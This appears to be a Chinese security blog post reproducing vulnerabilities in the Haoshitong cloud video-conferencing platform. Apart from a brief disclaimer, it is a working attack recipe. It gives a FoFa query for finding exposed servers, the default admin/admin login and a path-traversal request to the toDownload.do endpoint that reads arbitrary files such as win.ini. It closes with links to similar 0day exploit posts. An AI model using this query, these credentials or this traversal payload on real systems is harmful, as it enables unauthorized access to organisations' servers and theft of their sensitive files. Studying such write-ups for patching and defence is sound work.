> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fMNE1PF5n81O1BpoDRlYkA)

  
![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)  

前言  

  

**申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，****切勿用于其它用途！**

  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

Part.1 漏洞背景  

  

好视通云会议是一款高效、便捷、低成本的网络视频会议产品，通过电脑或手机登录好视通云平台，便可快速地与全球各地团队进行实时音视频沟通，并可同步分享各类数据文档。

  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

Part.2 漏洞描述  

  

好视通视频会议平台存在弱口令及前台任意文件下载漏洞。

可获取任意敏感文件信息。  

  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

Part.3 漏洞影响范围  

  

**Copyright © 2013-2019**  

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbLMBDojxubhjEjZeyU4akU8Ss7s1O3sNiagn2dvCCExHaoNxBY39twke0MvEkoKCmApNn66ddYtrg/640?wx_fmt=png)

**Copyright ©  2013-2018**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbLMBDojxubhjEjZeyU4akUlahP0iaMKy9icgeSicE5zmyDrnUSp6IzpGiaImYtJ0v3sLCMMOMpbKw7wQ/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

Part.4 FoFa 语法  

  

```
"深圳银澎云计算有限公司"
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbLMBDojxubhjEjZeyU4akUqdBwic2AicTV51UBviaC7zqkmRQSPD9ZiafVrZ5s6Knss8MibSStgTo5UnQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)

Part.5 漏洞复现  

  

该系统存在一个默认的管理员口令  

```
admin / admin
```

**后台界面：**  

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbLMBDojxubhjEjZeyU4akU4obCo5hbrwlicQicbib6qzN5GjPlf8Wosp7kgpCHD48Urz4rYPfT9dEyA/640?wx_fmt=png)

**前台任意文件下载****  
漏洞 url:**  

```
/register/toDownload.do?fileName=敏感文件路径
```

**漏洞复现：**

```
https://xxxxxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbLMBDojxubhjEjZeyU4akU2odTjG7icgruJeSP536B37jictSMy8GsQQiaqc9AlVOvNdaliaURQJibSrQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGbLMBDojxubhjEjZeyU4akUhBt0kJ0e4u8XTL3dBjmT3o4FPF2xNkibdBp6czibicXxTsicXaFKhGVoIA/640?wx_fmt=png)  

**复现成功！**

  

**如果对你有帮助的话  
那就长按二维码，关注我们吧！**  

![](https://mmbiz.qpic.cn/mmbiz_png/Qx4WrVJtMVKBxb9neP6JKNK0OicjoME4RvV4HnTL7ky0RhCNB0jrJ66pBDHlSpSBIeBOqCrOTaWZ2GNWv466WNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGbLMBDojxubhjEjZeyU4akUy829mO1s5xdZrknLklZ0CUEk4AXFia2kM6X9R8kiaxia4z3NGpibZvD0ibA/640?wx_fmt=jpeg)  

  
![](https://mmbiz.qpic.cn/mmbiz_png/wKOZZiacmHTc9LIKRXddrzz6MosLdiaH4EQNQgzsrSXHObdAia8yeIlLz6MbK9FxNDr44G7FNb2DBufqkjpwiczAibA/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)**  [实战 | 记一次利用 mssql 上线](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484628&idx=1&sn=2345aec9a4550a194dc5a28b0c5cd496&chksm=c07fbf20f708363614e51e5525c1aad9b4c8f5a50b391b0c83f11d1073a26d7bb8f4dc3a9fc8&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [漏洞复现 | 某系统通用（0day）](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484741&idx=1&sn=62989d6b4d1540a8ec829f665e42e033&chksm=c07fbeb1f70837a7577a86d3687a8c8fa177eb5115e14b7fe0727b80021baaad6378b3a62c76&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)   [漏洞复现 | （通用 0day）某实践教学平台存在通用 SQLi 漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484824&idx=1&sn=14e2ac20d29f2d56654405100ae5c604&chksm=c07fbe6cf708377af8063a01ff37b8f66c4c9906d55c57b2e9e35462ff856969acb5c08b9023&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif) [漏洞复现 | Microsoft Windows10 本地提权漏权 CVE-­2021­-1732](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484765&idx=1&sn=c454dc78e4340bcaae2f6cc1f7d944fa&chksm=c07fbea9f70837bf68bf4b37358bdbf9affb87e5fb077e55db2136da53303b697b96ead5ce10&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif) [漏洞复现 | （通用 0day）金和 C6 协同 OA 管理平台后台存在水平越权漏洞](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484809&idx=1&sn=833a086a0d4a75e4bedbc4e2f7bcf19d&chksm=c07fbe7df708376befb44b4398a5c576d3c59f85304bdcf4c0d64764ecad4c50d518d926e846&scene=21#wechat_redirect)

右下角求赞求好看，喵~